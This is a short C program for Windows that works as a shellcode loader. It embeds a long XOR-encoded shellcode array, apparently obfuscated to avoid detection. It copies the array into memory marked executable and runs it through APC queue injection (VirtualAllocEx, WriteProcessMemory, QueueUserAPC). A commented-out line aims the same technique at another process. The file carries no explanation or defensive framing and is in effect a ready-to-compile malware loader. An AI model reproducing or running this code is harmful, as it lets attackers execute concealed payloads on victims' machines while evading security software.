﻿#include<Windows.h>
#include<stdio.h>

char shellcode[] = 
"\xeb\x27\x5b\x53\x5f\xb0\x32\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xb9\xfb"
"\x74\x07\x80\x3e\x32\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x0e\x09\x0f\x32\xe5\x2e\x54\x5d\x56\xbf\x1f\xf5\xa1\x7b"
"\xf4\x58\x57\x5a\x51\x84\x0f\x3f\x09\x41\xf0\xc9\x41\xf0\xc8"
"\x6f\x8e\x31\x34\xc6\x7a\x0e\x8f\x30\x18\x7a\xe4\xe2\xe9\xf1"
"\xe8\xe7\xda\xf6\xf0\xf1\x06\x01\x07\x18\xeb\x27\x5b\x53\x5f"
"\xb0\xd8\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48"
"\xff\xc7\x48\xff\xc6\x66\x81\x3f\xf3\x62\x74\x07\x80\x3e\xd8"
"\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x09\x0f\x0e\xd8"
"\xe2\x28\x55\x5a\x50\xbe\x67\xf3\xa0\x7c\xf2\x59\x50\x5c\x50"
"\x83\x09\x3e\x0e\x47\xf1\xce\x47\xf1\xcf\x69\x8f\x36\x9f\x77"
"\x7d\x08\x8e\x37\x61\x7b\xe3\xe4\xe8\xf6\xee\xe6\xdd\xf0\xf1"
"\xf6\x01\x07\x06\x61\xeb\x27\x5b\x53\x5f\xb0\xb7\xfc\xae\x75"
"\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6"
"\x66\x81\x3f\x6c\x33\x74\x07\x80\x3e\xb7\x75\xea\xeb\xe6\xff"
"\xe1\xe8\xd4\xff\xff\xff\x0f\x0e\x07\xb7\xe4\x29\x5c\x5c\x51"
"\xb7\xd9\xf2\xa9\x7a\xf3\x50\x56\x5d\x59\x85\x08\x37\x08\x46"
"\xf8\xc8\x46\xf8\xc9\x68\x86\x30\x0c\xf8\x7b\x09\x87\x31\xd8"
"\x72\xe5\xe5\xe1\xf0\xef\xef\xdb\xf1\xf8\xf0\x1c\x11\x1d\xd8"
"\xfe\x3e\x47\x46\x46\xac\xe6\xe5\xb2\x60\xe4\x4b\x4c\x4a\x42"
"\x9f\x1f\x2c\x12\x51\xe3\xd2\x51\xe3\xd3\x7f\x9d\x2a\xed\x4e"
"\x61\x1e\x9c\x2b\xea\x69\xff\xf2\xfa\xea\xf8\xf4\xc1\xe6\xe3"
"\xea\x1b\x15\xe6\xf0\x32\x4c\x43\x41\xac\x82\xe9\xb9\x65\xe3"
"\x4b\x42\x46\x49\x9a\x18\x2c\x1c\x5d\xe8\xd7\x56\xe3\xdd\x73"
"\x96\x2f\x6d\x97\x6f\x12\x97\x2e\x87\x69\xf1\xfe\xf1\xef\xff"
"\xf4\xcf\xea\xe8\xef\x17\x1e\x82\xf7\x32\x42\x4f\x4a\xa9\x85"
"\xe9\xb7\x69\xe8\x4e\x45\x46\x47\x96\x13\x29\x1b\x5d\xe6\xdb"
"\x5d\xe6\xda\x73\x98\x23\x9c\xce\x68\x12\x99\x22\x8c\x6c\xf6"
"\xfe\xff\xe3\xf4\xf1\xc8\xea\xe6\xe3\x17\x10\x85\xfc\x37\x45"
"\x4f\x44\xa5\x8b\xec\xb0\x69\xe6\x42\x4e\x43\x40\x96\x1d\x25"
"\x10\x58\xe1\xdb\x53\xea\xd1\x76\x9f\x23\xee\xeb\x63\x17\x9e"
"\x22\x87\x60\xfd\xfb\xf8\xe3\xfa\xfd\xc3\xef\xe1\xe3\x12\x17"
"\x8b\xf2\x3b\x4e\x4a\x43\xa5\xfe\xe0\xbb\x6c\xe1\x42\x40\x4f"
"\x4b\x93\x1a\x25\x1e\x54\xea\xde\x54\xea\xdf\x7a\x94\x26\x0c"
"\x6f\x6d\x1b\x95\x27\xfb\x60\xf3\xf7\xf3\xe6\xfd\xfd\xcd\xe3"
"\xea\xe6\x1e\x1c\xfe\xf5\x3b\x40\x46\x48\xa0\x6c\xe0\xb5\x60"
"\xea\x47\x47\x4f\x45\x9f\x11\x20\x19\x54\xe4\xd2\x5f\xef\xd8"
"\x7a\x9a\x2a\xb4\x4e\x6a\x1b\x9b\x2b\x65\x65\xf4\xf7\xfd\xea"
"\xf6\xf8\xca\xe3\xe4\xea\x1e\x12\x6c\xfe\x3e\x47\x46\x46\xac"
"\xa8\xe5\xb2\x60\xe4\x4b\x4c\x4a\x42\x9f\x1f\x2c\x12\x51\xe3"
"\xd2\x51\xe3\xd3\x7f\x9d\x2a\x28\x39\x61\x1e\x9c\x2b\xa4\x69"
"\xff\xf2\xfa\xea\xf8\xf4\xc1\xe6\xe3\xea\x3d\xa1\xda\x1a\x63"
"\x62\x62\x88\x0b\xc1\x96\x44\xc0\x6f\x68\x6e\x66\xbb\x3b\x08"
"\x36\x75\xc7\xf6\x75\xc7\xf7\x5b\xb9\x0e\xaf\x1d\x45\x3a\xb8"
"\x0f\x07\x4d\xdb\xd6\xde\xce\xdc\xd0\xe5\xc2\xc7\xce\x2e\x02"
"\xde\x66\xa8\xc6\xde\xc3\xee\x2e\x2b\x22\x6f\x7a\x63\x7e\x79"
"\x73\x78\x63\x13\xfc\x4e\x6a\xa5\x79\x42\x66\xa0\x70\x36\x63"
"\xa9\x7c\x0b\x6a\xa5\x59\x72\x66\x24\x95\x64\x61\x6f\x1f\xe2"
"\x6a\x1f\xeb\x8e\x12\x4a\x5e\x2c\x07\x02\x6f\xea\xeb\x23\x6a"
"\x23\xef\xc9\xcf\x7c\x6a\x73\x66\xa0\x70\x0e\xa0\x60\x12\x63"
"\x23\xfe\x4d\xa3\x56\x33\x29\x2c\x24\xa7\x5c\x2b\x22\x2e\xa0"
"\xa2\xa6\x2b\x22\x2e\x63\xa7\xee\x5f\x45\x66\x2a\xf2\x7e\xa0"
"\x6a\x36\x6f\xa9\x6e\x0b\x6b\x2f\xfb\xc1\x78\x63\xdd\xe7\x6a"
"\xa9\x1a\xa3\x6a\x2f\xfd\x6f\x1f\xe2\x6a\x1f\xeb\x8e\x6f\xea"
"\xeb\x23\x6a\x23\xef\x13\xc2\x5b\xda\x6e\x2d\x67\x06\x26\x6e"
"\x1b\xff\x5e\xfa\x76\x6f\xa9\x6e\x0f\x6b\x2f\xfb\x44\x6f\xa0"
"\x2e\x66\x6f\xa9\x6e\x37\x6b\x2f\xfb\x63\xa5\x2f\xaa\x66\x2a"
"\xf2\x6f\x73\x63\x76\x75\x7b\x74\x6a\x7a\x6f\x72\x63\x74\x63"
"\xa1\xc2\x0b\x63\x7c\xd4\xc2\x76\x6a\x7b\x74\x63\xa9\x3c\xc2"
"\x69\xd1\xd4\xdd\x73\x62\x9c\x59\x58\x10\x71\x18\x10\x2e\x2b"
"\x63\x78\x62\xab\xc8\x63\xa3\xc2\x8b\x23\x2e\x2b\x6b\xa7\xce"
"\x6b\x92\x29\x22\x3f\x77\xe2\x86\x91\xac\x6f\x7f\x6b\xa7\xcf"
"\x6e\xa7\xda\x63\x94\x67\x55\x08\x2c\xdd\xfb\x67\xab\xc4\x43"
"\x23\x2f\x2b\x22\x77\x6a\x98\x07\xab\x49\x2e\xd4\xf7\x44\x21"
"\x63\x70\x7b\x72\x63\x1a\xeb\x63\x1a\xe2\x66\xd4\xe2\x66\xa2"
"\xe0\x66\xd4\xe2\x66\xa2\xe3\x6f\x91\xc8\x21\xf4\xc2\xd1\xfe"
"\x6a\xa7\xec\x48\x3e\x6a\x7a\x62\xa2\xc0\x66\xa2\xdb\x6f\x91"
"\xbb\x8b\x5f\x43\xd1\xfe\xa7\xee\x5f\x28\x67\xd4\xec\x5b\xce"
"\xca\xbd\x2b\x22\x2e\x63\xa1\xc2\x3b\x6a\xa7\xc9\x6f\x1f\xe2"
"\x48\x2a\x6a\x7a\x66\xa2\xdb\x6f\x91\x20\xf7\xe3\x7d\xd1\xfe"
"\xa1\xd6\x2b\x5c\x7b\x63\xa1\xea\x0b\x7c\xa7\xdd\x48\x6e\x6a"
"\x7b\x46\x2b\x32\x2e\x2b\x63\x76\x63\xab\xdc\x63\x13\xe7\x6a"
"\x98\x76\x8f\x71\xcb\xd4\xf7\x66\xa2\xe1\x67\xa2\xe5\x63\x1a"
"\xeb\x67\xa2\xd2\x66\xa2\xf8\x66\xa2\xdb\x6f\x91\x20\xf7\xe3"
"\x7d\xd1\xfe\xa1\xd6\x2b\x5f\x06\x73\x63\x79\x72\x4a\x2e\x6b"
"\x22\x2e\x6a\x7a\x44\x2b\x78\x6f\x91\x29\x01\x24\x12\xd1\xfe"
"\x75\x77\x6a\x98\x5b\x45\x6f\x4f\xd4\xf7\x67\xd4\xec\xc7\x17"
"\xdd\xd1\xd4\x6a\x2f\xe8\x6a\x07\xed\x6a\xab\xdd\x57\x9a\x6a"
"\xdd\xc9\x73\x48\x2e\x72\x99\xce\x36\x08\x24\x6a\xab\xf4\xd4"
"\xf7\xaf\x1d\x24\x3c\xbd\x42\x09\x66\xe2\xee\x95\xc2\x68\x9e"
"\xe1\x4b\x0c\xf8\x6c\x33\x99\x76\xf3\x62\x32\xc7\xb9\xfb";

int main() {

	HANDLE hThread = NULL;
	HANDLE hProcess = 0;
	DWORD ProcessId = 0;
	LPVOID AllocAddr = NULL;


	hProcess = GetCurrentProcess();
	//hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, 12524);//notepad.exe
	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);


	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);

	QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;

}